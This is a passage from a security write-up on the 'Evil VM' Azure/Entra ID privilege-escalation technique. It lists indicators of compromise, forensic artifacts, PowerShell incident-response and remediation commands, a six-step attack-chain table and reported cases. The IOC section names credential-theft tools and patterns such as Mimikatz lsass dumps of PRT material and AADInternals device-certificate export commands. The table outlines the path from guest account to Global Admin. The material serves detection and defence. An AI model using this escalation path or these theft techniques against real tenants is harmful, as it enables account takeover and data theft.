Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.State -eq "enabled" } | Select-Object DisplayName

# 4. Verify no Gen 1 VMs exist (if Gen 2 enforcement is in place)
Write-Host "=== VM Generation Check ==="
Get-AzVM | Select-Object Name, @{Name="Generation"; Expression={if($_.StorageProfile.OsDisk.ManagedDisk.Id -match 'gen2') {"Gen2"} else {"Gen1"}}}

# Expected output for all checks: Indicates mitigations are active
```

**What to Look For:**
- AllowInvitesFrom should be "adminsAndGuestInviters" (not "everyone")
- Device registration should be restricted or disabled
- Conditional Access policies should include rules for admin access, MFA, device compliance
- All existing VMs should be Gen 2 (after policy enforcement, Gen 1 creation should fail)

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files & Registry:**
    - `C:\Program Files\AADInternals\` (AADInternals module directory)
    - `C:\temp\device_cert.pfx` (Exported device certificate)
    - `C:\temp\device_transport_key.bin` (Exported transport key)
    - `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CDPSvc` (Device certificate registry location)
    - `HKLM:\System\CurrentControlSet\Services\AAD` (Entra ID service registry)

*   **Network:**
    - TCP 443 to `*.graph.microsoft.com` (Microsoft Graph API)
    - TCP 443 to `*.management.azure.com` (Azure Resource Manager)
    - TCP 443 to `login.microsoftonline.com` (Entra ID authentication)
    - TCP 443 to `device.login.microsoftonline.com` (Device code flow)

*   **Processes:**
    - `powershell.exe` with CommandLine containing "AADInternals", "Export-AADIntLocal", "Get-AADIntDevice"
    - `python.exe` or `python3.exe` executing `roadtx` commands
    - `mimikatz.exe` or `mimikatz.dll` in memory

*   **Entra ID Audit Logs:**
    - Operation: "Invite user" (guest invitations)
    - Operation: "Confirm invited user" (guest accepting invitation)
    - Operation: "Create subscription" (subscription creation by guest)
    - Operation: "Change subscription directory" (subscription transfer)
    - Operation: "Register device" (device registration)

#### Forensic Artifacts

*   **Disk:**
    - Azure VM RDP session logs: `C:\ProgramData\Microsoft\Windows\Hyper-V\...`
    - PowerShell transcript file (if enabled): `C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\...`
    - Azure CLI/PowerShell credential cache: `C:\Users\[user]\.azure\` or `.config\az\`

*   **Memory:**
    - Mimikatz dump of lsass.exe process will contain PRT token material if user is logged in
    - AADInternals export of device certificate held in memory during execution

*   **Cloud:**
    - Azure Activity Log: VM creation, extension deployment, IAM role assignments
    - Entra ID Audit Log: Guest invitations, subscription transfers, device registrations, sign-in events
    - Azure VM extension logs: `C:\Packages\Plugins\Microsoft.Azure.ActiveDirectory.AADLoginForWindows\`
    - SignInLogs: Look for RefreshToken sign-ins from unusual locations/IPs followed by administrative access

*   **Event Logs:**
    - Event ID 4688 (Process Creation) - PowerShell/cmd with suspicious commands
    - Event ID 4720 (User Account Created) - New admin accounts created on VM
    - Event ID 4722 (User Account Enabled) - Disabled accounts re-enabled
    - Event ID 5156 (Firewall) - Outbound connections to Azure endpoints from non-standard processes

#### Response Procedures

1.  **Isolate (Immediate Action):**
    
    **Command (Azure - Stop VM):**
    ```powershell
    Stop-AzVM -ResourceGroupName "evil-vm-rg" -Name "evil-vm-001" -Force
    # Or delete entirely
    Remove-AzVM -ResourceGroupName "evil-vm-rg" -Name "evil-vm-001" -Force
    ```
    
    **Manual (Azure Portal):**
    - Go to **Azure Portal** → **Virtual Machines** → Select VM → **Stop** or **Delete**
    - Ensure **Delete associated resources** is checked
    
    **Command (Entra ID - Disable Device):**
    ```powershell
    Connect-MgGraph -Scopes "Device.ReadWrite.All"
    $device = Get-MgDevice -Filter "displayName eq 'evil-vm-001'"
    Update-MgDevice -DeviceId $device.Id -AccountEnabled $false
    ```
    
    **Command (Entra ID - Revoke PRT Sessions):**
    ```powershell
    # Revoke all refresh tokens for compromised user
    Connect-MgGraph -Scopes "User.ReadWrite.All"
    Revoke-MgUserRefreshToken -UserId (Get-MgUser -Filter "mail eq 'phished.admin@company.com'").Id
    ```

2.  **Collect Evidence (Within 1 Hour):**
    
    **Command (Export Azure Activity Logs):**
    ```powershell
    # Export activity logs for the past 24 hours
    Get-AzActivityLog -StartTime (Get-Date).AddDays(-1) -ResourceGroup "evil-vm-rg" `
        | Export-Csv -Path "C:\Evidence\azure_activity.csv"
    ```
    
    **Command (Export Entra ID Audit Logs):**
    ```powershell
    Connect-MgGraph -Scopes "AuditLog.Read.All"
    
    # Export audit logs for guest operations
    $auditLogs = Get-MgAuditLogDirectoryAudit -Filter "displayName eq 'Invite user'" `
        -Top 1000
    $auditLogs | Export-Csv -Path "C:\Evidence\audit_logs_guests.csv"
    ```
    
    **Command (Export SignInLogs for Phished User):**
    ```powershell
    Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'phished.admin@company.com'" `
        -All -Top 500 | Export-Csv -Path "C:\Evidence\signin_logs.csv"
    ```
    
    **Manual (Azure Portal):**
    - Go to **Activity Log** → Filter by relevant time range and resource group → **Export to CSV**
    - Go to **Entra ID** → **Audit logs** → Filter by User/Operation → **Download Results**
    - Go to **Azure Portal** → **Azure Virtual Machines** → Select VM → **Run command** to capture state (optional, before deletion)

3.  **Remediate (Within 4 Hours):**
    
    **Command (Force Password Reset for All Admins):**
    ```powershell
    # Reset password for compromised admin
    Connect-MgGraph -Scopes "UserAuthenticationMethod.ReadWrite.All"
    
    $userId = (Get-MgUser -Filter "mail eq 'phished.admin@company.com'").Id
    Reset-MgUserPassword -UserId $userId -NewPassword (New-Guid).Guid
    ```
    
    **Command (Disable Compromised Guest Account):**
    ```powershell
    # Disable guest account that was used for subscription owner privilege
    $guestId = (Get-MgUser -Filter "mail eq 'attacker.guest@outlook.com'").Id
    Update-MgUser -UserId $guestId -AccountEnabled $false
    ```
    
    **Command (Remove Subscription Owner Access):**
    ```powershell
    # Remove guest from subscription owner role
    Get-AzRoleAssignment -Scope "/subscriptions/$subscriptionId" -ObjectId $guestId `
        | Remove-AzRoleAssignment
    ```
    
    **Command (Delete Compromised Subscription):**
    ```powershell
    # If subscription was created by attacker and contains no legitimate resources
    Remove-AzSubscription -SubscriptionId $subscriptionId -Force
    ```
    
    **Manual (Azure Portal):**
    1. **Reset admin password:** Entra ID → Users → Select user → Reset password
    2. **Disable guest:** Entra ID → Users → Select guest → Edit properties → Account enabled: OFF
    3. **Remove RBAC roles:** IAM → Remove all role assignments for guest
    4. **Delete subscription:** Cost Management + Billing → Select subscription → Cancel/Delete

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [REALWORLD-001](../../) Initial Guest Account Compromise | Attacker compromises or invites B2B guest account via phishing, helpdesk social engineering, or password spray |
| **2** | **Lateral Movement** | [REALWORLD-013] **Evil VM Device Identity** | **Guest account invited to target tenant, subscription transferred, Gen 1 VM created and Entra ID-joined** |
| **3** | **Credential Access** | [REALWORLD-014](../../) PRT Device Identity Manipulation | Device certificate extracted, phishing attack on admin for refresh token, refresh token upgraded to PRT |
| **4** | **Privilege Escalation** | [REALWORLD-015](../../) Guest to Admin Azure VM | PRT used to authenticate as phished admin, Global Admin access obtained |
| **5** | **Persistence** | Service Principal Creation, Conditional Access Modification | Attacker creates backdoor service principal, disables MFA requirements, modifies Conditional Access policies |
| **6** | **Impact** | Data Exfiltration from M365, On-Premises AD Compromise | Attacker accesses SharePoint, Teams, Exchange; pivots to on-premises via federation tokens or Kerberos delegation |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: BeyondTrust Research (2025) - Evil VM Attack

- **Target:** Fortune 500 Technology Company
- **Timeline:** Discovery in July 2025; attack likely active for weeks prior
- **Technique Status:** Attack leveraged default Entra ID guest invitation policies, lack of Gen 2 VM enforcement, and PRT theft via device code phishing
- **Impact:** Researchers demonstrated privilege escalation from B2B guest account (with no explicit permissions) to full Global Admin access within minutes
- **Reference:** [BeyondTrust Evil VM Research](https://www.beyondtrust.com/blog/entry/evil-vm)
- **Lessons Learned:** Default Azure/Entra ID configurations enable sophisticated privilege escalation; organizations must enforce restrictive guest policies, Gen 2 VM enforcement, and device compliance requirements

#### Example 2: Microsoft Defender for Cloud Alert (2025) - Guest Attempting VM Creation

- **Target:** Multinational Financial Services Company
- **Timeline:** Incident detected in real-time by Microsoft Defender for Cloud
- **Technique Status:** MDC alert triggered on "Guest Account Creating High-Privilege Resources"; investigation revealed Gen 1 VM creation attempt with Entra ID login extension
- **Impact:** Rapid containment prevented evil VM deployment; guest account revoked and subscription transferred out
- **Reference:** [Microsoft Security Blog - Identity Attacks on Azure](https://www.microsoft.com/en-us/security/blog/)
- **Lessons Learned:** Alerts on guest resource creation, subscription transfers, and Gen 1 VM creation are effective detection mechanisms

---